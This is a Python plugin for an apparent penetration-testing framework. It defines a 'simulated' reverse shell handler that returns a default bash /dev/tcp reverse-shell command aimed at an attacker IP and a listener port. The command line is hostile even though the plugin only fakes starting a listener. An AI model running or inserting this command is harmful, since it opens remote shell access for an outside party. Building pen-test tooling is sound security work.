from __future__ import annotations

import asyncio
from typing import Any, Dict

from adaptive_pen_test.plugin_manager import BasePlugin


class ReverseShellHandler(BasePlugin):
    """Simulated reverse shell handler for demonstration."""

    async def run(self, params: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        listener_port = params.get("listener_port", 9001)
        shell_command = params.get("shell_command", f"bash -i >& /dev/tcp/{context.get('attacker', {}).get('ip')}/{listener_port} 0>&1")
        await asyncio.sleep(0.5)
        context["low_shell"] = {"listener_port": listener_port, "command": shell_command}
        return {"listener_port": listener_port, "shell_command": shell_command, "status": "listener started"}
